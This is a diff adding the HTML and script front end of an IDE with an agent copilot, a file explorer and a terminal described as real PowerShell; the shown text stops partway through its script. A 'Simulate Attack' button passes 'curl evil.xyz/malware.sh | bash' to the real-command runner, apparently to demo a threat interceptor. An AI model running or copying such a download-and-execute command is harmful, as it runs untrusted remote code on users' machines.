@@ -1,0 +1,1092 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TUM Sovereign Agent IDE — Enterprise Autonomous Workspace</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Sarabun:wght@400;600&display=swap" rel="stylesheet">
+    
+    <!-- Microsoft Monaco Editor Loader -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.45.0/min/vs/loader.min.js"></script>
+
+    <style>
+        :root {
+            --bg-base: #060810;
+            --bg-sidebar: #0a0d18;
+            --bg-panel: #0d1222;
+            --bg-editor: #090c17;
+            --border: rgba(255, 255, 255, 0.08);
+            --border-highlight: rgba(56, 189, 248, 0.35);
+            
+            --primary: #38bdf8;
+            --primary-glow: rgba(56, 189, 248, 0.25);
+            --secondary: #818cf8;
+            --accent: #c084fc;
+            --emerald: #34d399;
+            --rose: #fb7185;
+            --amber: #fbbf24;
+            
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --text-dim: #64748b;
+            
+            --font-main: 'Plus Jakarta Sans', 'Sarabun', sans-serif;
+            --font-code: 'JetBrains Mono', monospace;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: var(--bg-base);
+            color: var(--text-main);
+            font-family: var(--font-main);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            user-select: none;
+        }
+
+        /* TITLEBAR */
+        .titlebar {
+            height: 42px;
+            background: var(--bg-sidebar);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            z-index: 100;
+        }
+        .titlebar-left { display: flex; align-items: center; gap: 12px; }
+        .app-badge {
+            display: flex; align-items: center; gap: 8px;
+            font-weight: 800; font-size: 13px; letter-spacing: 0.5px; color: #fff;
+        }
+        .app-badge span {
+            color: var(--primary); font-family: var(--font-code); font-size: 11px; font-weight: 600;
+            background: rgba(56, 189, 248, 0.12); padding: 2px 8px; border-radius: 4px; border: 1px solid var(--border-highlight);
+        }
+        .top-breadcrumbs { font-size: 12px; color: var(--text-muted); display: flex; align-items: center; gap: 6px; }
+        .titlebar-actions { display: flex; align-items: center; gap: 12px; }
+        .status-pill {
+            display: flex; align-items: center; gap: 6px; font-size: 11px; font-family: var(--font-code);
+            padding: 4px 10px; border-radius: 20px; background: rgba(52, 211, 153, 0.1);
+            border: 1px solid rgba(52, 211, 153, 0.3); color: var(--emerald);
+        }
+        .status-pill.danger {
+            background: rgba(251, 113, 133, 0.1); border-color: rgba(251, 113, 133, 0.3); color: var(--rose);
+        }
+        .pulse-dot { width: 7px; height: 7px; border-radius: 50%; background: currentColor; box-shadow: 0 0 6px currentColor; }
+
+        /* WORKSPACE BODY */
+        .workspace-body { flex: 1; display: flex; overflow: hidden; position: relative; }
+
+        /* ACTIVITY BAR */
+        .activity-bar {
+            width: 48px; background: #04060c; border-right: 1px solid var(--border);
+            display: flex; flex-direction: column; align-items: center; padding: 12px 0; gap: 16px; z-index: 50;
+        }
+        .activity-btn {
+            width: 36px; height: 36px; border-radius: 8px; border: none; background: transparent;
+            color: var(--text-dim); font-size: 18px; display: flex; align-items: center; justify-content: center;
+            cursor: pointer; transition: all 0.2s; position: relative;
+        }
+        .activity-btn:hover { color: var(--text-main); background: rgba(255, 255, 255, 0.05); }
+        .activity-btn.active { color: var(--primary); background: rgba(56, 189, 248, 0.12); }
+        .activity-btn.active::before {
+            content: ''; position: absolute; left: -6px; top: 8px; bottom: 8px; width: 3px; background: var(--primary); border-radius: 0 2px 2px 0;
+        }
+
+        /* SIDEBAR */
+        .sidebar {
+            width: 270px; background: var(--bg-sidebar); border-right: 1px solid var(--border);
+            display: flex; flex-direction: column; overflow: hidden;
+        }
+        .sidebar-header {
+            padding: 12px 16px; font-size: 11px; font-weight: 700; text-transform: uppercase;
+            letter-spacing: 1px; color: var(--text-muted); border-bottom: 1px solid var(--border);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .sidebar-content { flex: 1; overflow-y: auto; padding: 8px 0; }
+        .tree-folder {
+            padding: 5px 12px; font-size: 11px; font-weight: 700; color: var(--text-dim); text-transform: uppercase;
+            cursor: pointer; display: flex; align-items: center; gap: 6px; transition: all 0.15s; user-select: none;
+            border-radius: 4px; margin: 1px 4px;
+        }
+        .tree-folder:hover { color: var(--text-main); background: rgba(255, 255, 255, 0.05); }
+        .folder-arrow {
+            font-size: 9px; display: inline-block; width: 12px; text-align: center; color: var(--text-muted);
+            transition: transform 0.15s ease;
+        }
+        .folder-children { transition: all 0.2s ease; }
+        .folder-children.collapsed { display: none !important; }
+        .tree-item {
+            padding: 5px 14px 5px 24px; font-size: 12px; font-family: var(--font-code); color: var(--text-muted);
+            display: flex; align-items: center; gap: 8px; cursor: pointer; transition: all 0.15s; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+            user-select: none; margin: 1px 4px; border-radius: 4px;
+        }
+        .tree-item:hover { color: var(--text-main); background: rgba(255, 255, 255, 0.04); }
+        .tree-item.active { color: var(--primary); background: rgba(56, 189, 248, 0.1); font-weight: 600; border-left: 2px solid var(--primary); }
+
+        /* CENTER STAGE */
+        .center-stage { flex: 1; display: flex; flex-direction: column; overflow: hidden; background: var(--bg-editor); }
+
+        /* TABS */
+        .editor-tabs { height: 36px; background: #070912; border-bottom: 1px solid var(--border); display: flex; align-items: center; overflow-x: auto; }
+        .editor-tab {
+            height: 100%; padding: 0 16px; display: flex; align-items: center; gap: 8px; font-size: 12px;
+            font-family: var(--font-code); color: var(--text-muted); border-right: 1px solid var(--border);
+            background: transparent; cursor: pointer; border-top: 2px solid transparent;
+        }
+        .editor-tab.active { color: var(--text-main); background: var(--bg-editor); border-top: 2px solid var(--primary); font-weight: 600; }
+        .save-btn {
+            margin-left: auto; margin-right: 12px; background: rgba(56, 189, 248, 0.15); border: 1px solid var(--border-highlight);
+            color: var(--primary); padding: 4px 12px; border-radius: 4px; font-size: 11px; font-weight: 600; cursor: pointer;
+        }
+        .save-btn:hover { background: var(--primary); color: #000; }
+
+        /* EDITOR CONTAINER */
+        .editor-container { flex: 1; position: relative; overflow: hidden; }
+        #monacoEditor { width: 100%; height: 100%; position: relative; }
+        #fallbackEditor {
+            width: 100%; height: 100%; background: var(--bg-editor); color: #e2e8f0;
+            font-family: var(--font-code); font-size: 13px; line-height: 1.6;
+            padding: 16px; border: none; outline: none; resize: none;
+            box-sizing: border-box; white-space: pre; tab-size: 2;
+        }
+
+        /* BOTTOM PANEL */
+        .bottom-panel { height: 230px; background: #04060b; border-top: 1px solid var(--border); display: flex; flex-direction: column; }
+        .panel-tab-bar {
+            height: 32px; background: #080b15; border-bottom: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: space-between; padding: 0 12px;
+        }
+        .panel-tabs-left { display: flex; gap: 4px; }
+        .panel-tab-btn {
+            background: transparent; border: none; color: var(--text-dim); font-size: 11px; font-weight: 700;
+            text-transform: uppercase; padding: 4px 10px; cursor: pointer; border-radius: 4px;
+        }
+        .panel-tab-btn.active { color: var(--text-main); background: rgba(255, 255, 255, 0.08); }
+        .terminal-viewport {
+            flex: 1; padding: 10px 14px; overflow-y: auto; font-family: var(--font-code); font-size: 12px;
+            line-height: 1.5; color: #cbd5e1; display: flex; flex-direction: column;
+        }
+        .terminal-output { flex: 1; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+        .terminal-input-row { display: flex; align-items: center; gap: 8px; padding-top: 6px; border-top: 1px solid rgba(255, 255, 255, 0.05); }
+        .terminal-prompt { color: var(--primary); font-weight: 700; }
+        .terminal-input { flex: 1; background: transparent; border: none; color: #f8fafc; font-family: var(--font-code); font-size: 12px; outline: none; }
+
+        /* RIGHT COPILOT */
+        .copilot-sidebar { width: 330px; background: var(--bg-sidebar); border-left: 1px solid var(--border); display: flex; flex-direction: column; }
+        .copilot-header { padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .copilot-title { font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
+        .copilot-messages { flex: 1; overflow-y: auto; padding: 14px; display: flex; flex-direction: column; gap: 12px; }
+        .msg-bubble { padding: 10px 12px; border-radius: 8px; font-size: 12px; line-height: 1.5; }
+        .msg-bubble.agent { background: rgba(16, 22, 38, 0.9); border: 1px solid var(--border); color: #cbd5e1; }
+        .msg-bubble.agent strong { color: var(--primary); }
+        .msg-bubble.user { background: rgba(56, 189, 248, 0.15); border: 1px solid var(--border-highlight); color: #fff; align-self: flex-end; }
+        .copilot-composer { padding: 12px; border-top: 1px solid var(--border); display: flex; flex-direction: column; gap: 8px; }
+        .copilot-input {
+            width: 100%; background: #04060b; border: 1px solid var(--border); border-radius: 8px;
+            padding: 8px 12px; color: #fff; font-family: var(--font-main); font-size: 12px; outline: none; resize: none; height: 60px;
+        }
+        .copilot-input:focus { border-color: var(--primary); }
+        .copilot-actions { display: flex; justify-content: space-between; align-items: center; }
+        .btn-mini {
+            background: linear-gradient(135deg, #0284c7, #2563eb); color: #fff; border: none; padding: 6px 14px;
+            border-radius: 6px; font-size: 11px; font-weight: 700; cursor: pointer; transition: all 0.15s;
+        }
+        .btn-mini:hover { filter: brightness(1.1); box-shadow: 0 0 10px var(--primary-glow); }
+        .btn-secondary { background: rgba(255, 255, 255, 0.08); border: 1px solid var(--border); color: var(--text-muted); }
+        .btn-secondary:hover { background: rgba(255, 255, 255, 0.12); color: #fff; }
+
+        /* STATUS BAR */
+        .statusbar {
+            height: 24px; background: #04060c; border-top: 1px solid var(--border); display: flex;
+            align-items: center; justify-content: space-between; padding: 0 12px; font-size: 11px; font-family: var(--font-code); color: var(--text-dim); z-index: 100;
+        }
+        .statusbar-left, .statusbar-right { display: flex; align-items: center; gap: 16px; }
+        .status-item { display: flex; align-items: center; gap: 5px; }
+
+        /* QUICK CHIPS */
+        .quick-chips {
+            display: flex; gap: 6px; overflow-x: auto; padding: 2px 0 6px 0; scrollbar-width: none;
+        }
+        .quick-chips::-webkit-scrollbar { display: none; }
+        .chip {
+            background: rgba(255, 255, 255, 0.06); border: 1px solid var(--border);
+            color: var(--text-muted); padding: 3px 8px; border-radius: 12px; font-size: 10px;
+            font-family: var(--font-code); cursor: pointer; white-space: nowrap; transition: all 0.15s;
+        }
+        .chip:hover {
+            color: var(--primary); border-color: var(--border-highlight); background: rgba(56, 189, 248, 0.1);
+        }
+
+        /* MOBILE NAV BAR (Responsive) */
+        .mobile-nav-bar {
+            display: none; height: 42px; background: #04060c; border-bottom: 1px solid var(--border);
+            align-items: center; justify-content: space-around; padding: 0 8px; z-index: 95;
+        }
+        .mobile-nav-btn {
+            background: transparent; border: none; color: var(--text-dim); font-size: 12px;
+            font-weight: 700; padding: 6px 12px; border-radius: 6px; cursor: pointer;
+        }
+        .mobile-nav-btn.active {
+            color: var(--primary); background: rgba(56, 189, 248, 0.12);
+        }
+
+        /* TABLET RESPONSIVE (< 1024px) */
+        @media (max-width: 1024px) {
+            .sidebar { width: 220px; }
+            .copilot-sidebar { width: 300px; }
+            .top-breadcrumbs { display: none; }
+        }
+
+        /* MOBILE RESPONSIVE (< 768px) */
+        @media (max-width: 768px) {
+            .mobile-nav-bar { display: flex; }
+            .activity-bar { display: none; }
+            .titlebar { padding: 0 10px; }
+            .top-breadcrumbs { display: none; }
+            .workspace-body { flex-direction: column; }
+            
+            .sidebar, .center-stage, .copilot-sidebar {
+                width: 100% !important; flex: 1 !important; display: none;
+            }
+            body.view-explorer .sidebar { display: flex; }
+            body.view-editor .center-stage { display: flex; }
+            body.view-editor .bottom-panel { display: none; }
+            body.view-terminal .center-stage { display: flex; }
+            body.view-terminal .editor-tabs, body.view-terminal .editor-container { display: none; }
+            body.view-terminal .bottom-panel { height: 100% !important; }
+            body.view-copilot .copilot-sidebar { display: flex; }
+            
+            .statusbar-right { display: none; }
+        }
+
+        /* TOAST */
+        #toast {
+            position: fixed; bottom: 36px; right: 24px; background: #0b0f1d; border: 1px solid var(--emerald);
+            color: var(--emerald); padding: 10px 18px; border-radius: 8px; font-size: 12px; font-family: var(--font-code);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5); display: none; z-index: 9999;
+        }
+    </style>
+</head>
+<body class="view-editor">
+    <!-- TOP TITLEBAR -->
+    <div class="titlebar">
+        <div class="titlebar-left">
+            <div class="app-badge">
+                🏛️ TUM Sovereign IDE
+                <span>Native Connected</span>
+            </div>
+            <div class="top-breadcrumbs">
+                <span>📁 Workspace:</span> <strong id="currentWorkspacePill" style="color: #fff; margin-left: 2px;">tum-central-director</strong>
+                <span style="color: var(--text-dim); margin: 0 4px;">/</span>
+                <span id="currentBreadcrumb" style="color: var(--primary);">package.json</span>
+            </div>
+        </div>
+
+        <div class="titlebar-actions">
+            <button class="btn-mini btn-secondary" onclick="openFolderPrompt()" title="Open any folder on this PC (Ctrl+O)" style="display: flex; align-items: center; gap: 5px;">
+                <span>📂</span> Open Folder...
+            </button>
+            <div class="status-pill" id="sentinelShieldPill">
+                <div class="pulse-dot"></div>
+                <span id="sentinelShieldText">SENTINEL: ARMED (0/100)</span>
+            </div>
+            <div class="status-pill" style="border-color: rgba(129, 140, 248, 0.3); color: var(--secondary);">
+                <span>⚛️ NIST ML-DSA-65</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- MOBILE NAV SWITCHER (Visible on phones & compact screens) -->
+    <div class="mobile-nav-bar">
+        <button class="mobile-nav-btn" id="mNav_explorer" onclick="switchMobileView('explorer')">📁 Files</button>
+        <button class="mobile-nav-btn active" id="mNav_editor" onclick="switchMobileView('editor')">📝 Code</button>
+        <button class="mobile-nav-btn" id="mNav_terminal" onclick="switchMobileView('terminal')">💻 Terminal</button>
+        <button class="mobile-nav-btn" id="mNav_copilot" onclick="switchMobileView('copilot')">🤖 Copilot</button>
+    </div>
+
+    <!-- MAIN WORKSPACE BODY -->
+    <div class="workspace-body">
+        <!-- ACTIVITY BAR -->
+        <div class="activity-bar">
+            <button class="activity-btn active" title="File Explorer" onclick="selectSidebarTab('explorer')">📁</button>
+            <button class="activity-btn" title="Git Worktree Fleet" onclick="selectSidebarTab('fleet')">🌿</button>
+            <button class="activity-btn" title="Sentinel Threat Radar" onclick="selectSidebarTab('sentinel')">🛡️</button>
+            <button class="activity-btn" title="AgentGate DAC Tokens" onclick="selectSidebarTab('agentgate')">🔐</button>
+        </div>
+
+        <!-- SIDEBAR -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <span id="sidebarHeaderTitle">Explorer: tum-central-director</span>
+                <div style="display: flex; gap: 8px; align-items: center;">
+                    <span style="cursor: pointer; font-size: 11px;" title="Collapse All Folders" onclick="collapseAllFolders()">▼/▶</span>
+                    <span style="cursor: pointer; font-size: 13px;" title="Open Folder..." onclick="openFolderPrompt()">📂</span>
+                    <span style="cursor: pointer; font-size: 13px;" title="Refresh" onclick="loadRealFileTree()">🔄</span>
+                </div>
+            </div>
+            <div class="sidebar-content" id="sidebarContent">
+                <div style="padding: 16px; color: var(--text-dim); font-size: 12px;">Loading real file tree...</div>
+            </div>
+        </div>
+
+        <!-- CENTER STAGE: MONACO EDITOR & TERMINAL -->
+        <div class="center-stage">
+            <!-- Tabs -->
+            <div class="editor-tabs" id="editorTabs">
+                <div class="editor-tab active" id="activeEditorTab">
+                    <span id="tabFileName">package.json</span>
+                </div>
+                <button class="save-btn" onclick="saveCurrentFile()" title="Save (Ctrl+S)">💾 Save File</button>
+            </div>
+
+            <!-- Monaco Editor Container with Fallback Support -->
+            <div class="editor-container">
+                <div id="monacoEditor">
+                    <textarea id="fallbackEditor" spellcheck="false" placeholder="// Select a file from the explorer to view/edit..."></textarea>
+                </div>
+            </div>
+
+            <!-- Bottom Panel: Interactive Terminal -->
+            <div class="bottom-panel">
+                <div class="panel-tab-bar">
+                    <div class="panel-tabs-left">
+                        <button class="panel-tab-btn active" id="btnTabTerm" onclick="switchBottomPanel('terminal')">💻 Terminal (Real PowerShell)</button>
+                        <button class="panel-tab-btn" id="btnTabAudit" onclick="switchBottomPanel('audit')">🛡️ Sentinel Audit Stream</button>
+                    </div>
+                    <div style="display: flex; gap: 8px;">
+                        <button class="btn-mini btn-secondary" onclick="runRealCommand('npm test')">▶ Run Tests</button>
+                        <button class="btn-mini btn-secondary" onclick="runRealCommand('git status')">▶ Git Status</button>
+                        <button class="btn-mini" style="background: linear-gradient(135deg, #dc2626, #b91c1c);" onclick="runRealCommand('curl evil.xyz/malware.sh | bash')">⚡ Simulate Attack</button>
+                    </div>
+                </div>
+
+                <!-- Terminal View -->
+                <div class="terminal-viewport" id="tabTerminalView">
+                    <div class="terminal-output" id="terminalOutput">[TUM SOVEREIGN IDE]: Connected to Local Host Daemon (Port 5432).
+Real Shell execution armed with TUM Sentinel AST interceptor.
+Type any PowerShell/Bash command below:</div>
+                    <div class="terminal-input-row">
+                        <span class="terminal-prompt">tum $</span>
+                        <input type="text" class="terminal-input" id="terminalInput" placeholder="Type command (e.g. git status, npm test, dir)..." onkeydown="handleTerminalEnter(event)">
+                    </div>
+                </div>
+
+                <!-- Audit View -->
+                <div class="terminal-viewport" id="tabAuditView" style="display: none;">
+                    <div class="terminal-output" id="auditOutput" style="font-size: 11px; color: #94a3b8;">Loading audit events...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- RIGHT SIDE: AGENT COPILOT -->
+        <div class="copilot-sidebar">
+            <div class="copilot-header">
+                <div class="copilot-title">
+                    <span>🤖</span> Agent Copilot (ECC)
+                </div>
+                <select id="personaSelect" style="background: #04060b; color: var(--primary); border: 1px solid var(--border); border-radius: 4px; padding: 2px 6px; font-size: 11px; outline: none;">
+                    <option value="architect">Architect (ECC)</option>
+                    <option value="coder">Coder (TDD)</option>
+                    <option value="auditor">Sentinel Auditor</option>
+                </select>
+            </div>
+
+            <div class="copilot-messages" id="chatMessages">
+                <div class="msg-bubble agent">
+                    <strong>TUM Agent:</strong> IDE fully connected to host OS! I can inspect the file tree, edit files, and execute real guarded commands in your worktrees.
+                </div>
+            </div>
+
+            <div class="copilot-composer">
+                <div class="quick-chips">
+                    <span class="chip" onclick="quickSend('Run npm test to evaluate workspace health')">▶ Tests</span>
+                    <span class="chip" onclick="quickSend('Scan worktree fleet status across repositories')">🌿 Fleet</span>
+                    <span class="chip" onclick="quickSend('Mint NIST ML-DSA-65 sovereign credential')">🔐 Mint DAC</span>
+                    <span class="chip" onclick="quickSend('Inspect Sentinel threat interceptor audit radar')">🛡️ Audit</span>
+                </div>
+                <textarea class="copilot-input" id="copilotPrompt" placeholder="Ask AI to architect, decompose, or code in a worktree (Enter to send)..." onkeydown="handleCopilotKey(event)"></textarea>
+                <div class="copilot-actions">
+                    <button class="btn-mini btn-secondary" onclick="copilotDecompose()">⚡ Decompose Vision</button>
+                    <button class="btn-mini" onclick="sendCopilotChat()">Send ➔</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- STATUS BAR -->
+    <div class="statusbar">
+        <div class="statusbar-left">
+            <div class="status-item" style="color: var(--primary);">
+                <span>🌿</span> <span id="currentBranchStatus">feature/SCRUM-25-sovereign-agentos-suite</span>
+            </div>
+            <div class="status-item">
+                <span>🛡️</span> Risk: <strong id="statusRiskScore" style="color: var(--emerald); margin-left: 3px;">0 / 100 (Safe)</strong>
+            </div>
+            <div class="status-item">
+                <span>⚛️</span> DAC: <span style="color: var(--secondary);" id="activeDacPill">dac_86b887f4...</span>
+            </div>
+        </div>
+
+        <div class="statusbar-right">
+            <div class="status-item" id="editorLineInfo">Ln 1, Col 1</div>
+            <div class="status-item">UTF-8</div>
+            <div class="status-item" id="editorLangIndicator">JSON</div>
+            <div class="status-item" style="color: var(--emerald);">● Native Host Connected</div>
+        </div>
+    </div>
+
+    <div id="toast">✓ File saved to disk</div>
+
+    <!-- SCRIPT ENGINE -->
+    <script>
+        let monacoInstance = null;
+        let currentWorkspaceDir = 'D:/TUM/tum-central-director';
+        let currentLoadedPath = 'D:/TUM/tum-central-director/package.json';
+        const API_BASE = window.location.origin;
+        const isNative = typeof window.tumAPI !== 'undefined';
+
+        // SHOW TOAST
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.style.display = 'block';
+            setTimeout(() => { t.style.display = 'none'; }, 3000);
+        }
+
+        // INITIALIZE ON LOAD
+        window.addEventListener('load', () => {
+            initMonacoEditor();
+            loadRealFileTree(currentWorkspaceDir);
+            readRealFile(currentLoadedPath);
+            loadRealAuditLog();
+
+            // Native Electron Menu Listeners
+            if (isNative && window.ipcRenderer) {
+                window.ipcRenderer.on('menu:save', () => saveCurrentFile());
+                window.ipcRenderer.on('nav:audit', () => switchBottomPanel('audit'));
+            }
+            if (isNative && window.tumAPI.onWorkspaceOpened) {
+                window.tumAPI.onWorkspaceOpened((newDir) => {
+                    switchWorkspace(newDir);
+                });
+            }
+        });
+
+        let currentTreeCache = [];
+
+        function findPrimaryFile(items) {
+            if (!items) return null;
+            const priorities = ['readme.md', 'package.json', 'index.html', 'index.ts', 'index.js', 'main.py', 'app.py', 'cargo.toml'];
+            for (const item of items) {
+                if (item.type === 'file' && priorities.includes(item.name.toLowerCase())) {
+                    return item;
+                }
+            }
+            for (const item of items) {
+                if (item.children) {
+                    const found = findPrimaryFile(item.children);
+                    if (found) return found;
+                }
+            }
+            return null;
+        }
+
+        function findFirstFile(items) {
+            if (!items) return null;
+            for (const item of items) {
+                if (item.type === 'file') return item;
+                if (item.children) {
+                    const found = findFirstFile(item.children);
+                    if (found) return found;
+                }
+            }
+            return null;
+        }
+
+        // OPEN FOLDER PROMPT (NATIVE DIALOG / WEB FALLBACK)
+        async function openFolderPrompt() {
+            let selected = null;
+            if (isNative && window.tumAPI && window.tumAPI.openFolderDialog) {
+                selected = await window.tumAPI.openFolderDialog();
+            } else {
+                selected = prompt('Enter absolute folder path to open:', currentWorkspaceDir);
+            }
+            if (selected) {
+                await switchWorkspace(selected);
+            }
+        }
+
+        async function switchWorkspace(newDir) {
+            currentWorkspaceDir = newDir.replace(/\\/g, '/');
+            const folderName = currentWorkspaceDir.split('/').filter(Boolean).pop() || currentWorkspaceDir;
+            document.getElementById('sidebarHeaderTitle').textContent = 'Explorer: ' + folderName;
+            document.getElementById('currentWorkspacePill').textContent = folderName;
+            showToast(`📂 Opened folder: ${folderName}`);
+
+            // Ensure explorer tab is selected
+            document.querySelectorAll('.activity-btn').forEach(b => b.classList.remove('active'));
+            document.querySelector('.activity-btn[title="File Explorer"]')?.classList.add('active');
+
+            await loadRealFileTree(currentWorkspaceDir);
+
+            // Open primary or first file
+            const fileToOpen = findPrimaryFile(currentTreeCache) || findFirstFile(currentTreeCache);
+            if (fileToOpen) {
+                await readRealFile(fileToOpen.path);
+            } else {
+                const emptyMsg = `// Workspace: ${currentWorkspaceDir}\n// (No files opened yet. Click any file in the Explorer to edit.)\n`;
+                if (monacoInstance) {
+                    monacoInstance.setValue(emptyMsg);
+                }
+                const fallback = document.getElementById('fallbackEditor');
+                if (fallback) fallback.value = emptyMsg;
+                document.getElementById('tabFileName').textContent = 'Workspace';
+                document.getElementById('currentBreadcrumb').textContent = 'root';
+            }
+
+            const out = document.getElementById('terminalOutput');
+            out.innerHTML += `\n<span style="color: var(--secondary); font-weight: 700;">[WORKSPACE CHANGED]:</span> Now rooted in <strong style="color: #fff;">${currentWorkspaceDir}</strong>\n`;
+            out.parentElement.scrollTop = out.parentElement.scrollHeight;
+        }
+
+        let currentFileContent = '';
+        function updateEditorLanguage(fileName) {
+            const ext = fileName.split('.').pop();
+            const langMap = { ts: 'typescript', js: 'javascript', json: 'json', md: 'markdown', html: 'html', css: 'css', cs: 'csharp' };
+            const lang = langMap[ext] || 'plaintext';
+            document.getElementById('editorLangIndicator').textContent = lang.toUpperCase();
+            if (monacoInstance && monacoInstance.getModel()) {
+                monaco.editor.setModelLanguage(monacoInstance.getModel(), lang);
+            }
+        }
+
+        // INIT MONACO
+        function initMonacoEditor() {
+            if (typeof require !== 'undefined') {
+                require.config({ paths: { vs: 'https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.45.0/min/vs' } });
+                require(['vs/editor/editor.main'], function () {
+                    const fallback = document.getElementById('fallbackEditor');
+                    if (fallback) fallback.style.display = 'none';
+
+                    monacoInstance = monaco.editor.create(document.getElementById('monacoEditor'), {
+                        value: currentFileContent || '{\n  "status": "Ready"\n}',
+                        language: 'json',
+                        theme: 'vs-dark',
+                        fontSize: 13,
+                        fontFamily: 'JetBrains Mono',
+                        minimap: { enabled: true },
+                        automaticLayout: true,
+                        lineNumbers: 'on',
+                        scrollBeyondLastLine: false,
+                        renderLineHighlight: 'all',
+                        cursorBlinking: 'smooth'
+                    });
+
+                    // Cursor position listener
+                    monacoInstance.onDidChangeCursorPosition(e => {
+                        document.getElementById('editorLineInfo').textContent = `Ln ${e.position.lineNumber}, Col ${e.position.column}`;
+                    });
+
+                    if (currentFileContent) {
+                        monacoInstance.setValue(currentFileContent);
+                        updateEditorLanguage(currentLoadedPath);
+                    }
+                }, function (err) {
+                    console.warn('Monaco CDN fallback active:', err);
+                });
+            }
+        }
+
+        // REAL FILE SYSTEM TREE (NATIVE IPC + HTTP FALLBACK)
+        async function loadRealFileTree(targetDir) {
+            const dir = targetDir || currentWorkspaceDir;
+            try {
+                let data;
+                if (isNative) {
+                    data = await window.tumAPI.getFileTree(dir);
+                } else {
+                    const res = await fetch(`${API_BASE}/api/fs/tree?dir=${encodeURIComponent(dir)}`);
+                    data = await res.json();
+                }
+                if (data && data.tree) {
+                    renderFileTree(data.tree);
+                }
+            } catch (err) {
+                console.error('Failed to load file tree:', err);
+            }
+        }
+
+        function renderFileTree(tree) {
+            const container = document.getElementById('sidebarContent');
+            container.innerHTML = '';
+            currentTreeCache = tree || [];
+
+            if (!tree || tree.length === 0) {
+                container.innerHTML = `
+                    <div style="padding: 24px 14px; color: var(--text-dim); font-size: 11px; font-family: var(--font-code); text-align: center;">
+                        <div style="font-size: 26px; margin-bottom: 8px;">📂</div>
+                        <div style="color: #fff; font-weight: 700; margin-bottom: 4px;">Empty Folder</div>
+                        <div>No files found in workspace</div>
+                    </div>
+                `;
+                return;
+            }
+
+            function walk(items, parentEl, level = 0) {
+                for (const item of items) {
+                    if (item.type === 'directory') {
+                        const folderEl = document.createElement('div');
+                        folderEl.className = 'tree-folder';
+                        folderEl.style.paddingLeft = `${10 + level * 14}px`;
+
+                        const arrow = document.createElement('span');
+                        arrow.className = 'folder-arrow';
+                        arrow.textContent = '▼';
+
+                        const icon = document.createElement('span');
+                        icon.textContent = '📁 ';
+
+                        const label = document.createElement('span');
+                        label.textContent = item.name;
+
+                        folderEl.appendChild(arrow);
+                        folderEl.appendChild(icon);
+                        folderEl.appendChild(label);
+                        parentEl.appendChild(folderEl);
+
+                        const childContainer = document.createElement('div');
+                        childContainer.className = 'folder-children';
+                        parentEl.appendChild(childContainer);
+
+                        // Click to collapse / expand folder
+                        folderEl.onclick = (e) => {
+                            e.stopPropagation();
+                            const isCollapsed = childContainer.classList.toggle('collapsed');
+                            arrow.textContent = isCollapsed ? '▶' : '▼';
+                            icon.textContent = isCollapsed ? '📁 ' : '📂 ';
+                        };
+
+                        if (item.children) {
+                            walk(item.children, childContainer, level + 1);
+                        }
+                    } else {
+                        const fileEl = document.createElement('div');
+                        fileEl.className = 'tree-item';
+                        fileEl.style.paddingLeft = `${24 + level * 14}px`;
+                        fileEl.title = item.path;
+                        fileEl.innerHTML = `📄 ${item.name}`;
+                        fileEl.onclick = (e) => {
+                            e.stopPropagation();
+                            document.querySelectorAll('.tree-item').forEach(el => el.classList.remove('active'));
+                            fileEl.classList.add('active');
+                            readRealFile(item.path);
+                        };
+                        parentEl.appendChild(fileEl);
+                    }
+                }
+            }
+
+            walk(tree, container);
+        }
+
+        // TOGGLE COLLAPSE / EXPAND ALL FOLDERS
+        let allCollapsed = false;
+        function collapseAllFolders() {
+            allCollapsed = !allCollapsed;
+            document.querySelectorAll('.folder-children').forEach(el => {
+                if (allCollapsed) el.classList.add('collapsed');
+                else el.classList.remove('collapsed');
+            });
+            document.querySelectorAll('.folder-arrow').forEach(el => {
+                el.textContent = allCollapsed ? '▶' : '▼';
+            });
+            showToast(allCollapsed ? '📁 All folders collapsed' : '📂 All folders expanded');
+        }
+
+        // REAL FILE READ (NATIVE IPC + HTTP FALLBACK)
+        async function readRealFile(filePath) {
+            currentLoadedPath = filePath.replace(/\\/g, '/');
+            const fileName = currentLoadedPath.split('/').pop() || currentLoadedPath;
+            let rel = currentLoadedPath;
+            if (rel.startsWith(currentWorkspaceDir)) {
+                rel = rel.substring(currentWorkspaceDir.length + 1);
+            }
+            document.getElementById('currentBreadcrumb').textContent = rel;
+            document.getElementById('tabFileName').textContent = fileName;
+
+            try {
+                let data;
+                if (isNative) {
+                    data = await window.tumAPI.readFile(filePath);
+                } else {
+                    const res = await fetch(`${API_BASE}/api/fs/read?path=${encodeURIComponent(filePath)}`);
+                    data = await res.json();
+                }
+
+                if (data && data.content !== undefined) {
+                    currentFileContent = data.content;
+                    const fallback = document.getElementById('fallbackEditor');
+                    if (fallback) fallback.value = data.content;
+
+                    if (monacoInstance) {
+                        monacoInstance.setValue(data.content);
+                        updateEditorLanguage(fileName);
+                    } else {
+                        updateEditorLanguage(fileName);
+                    }
+                }
+            } catch (err) {
+                console.error('File read error:', err);
+            }
+        }
+
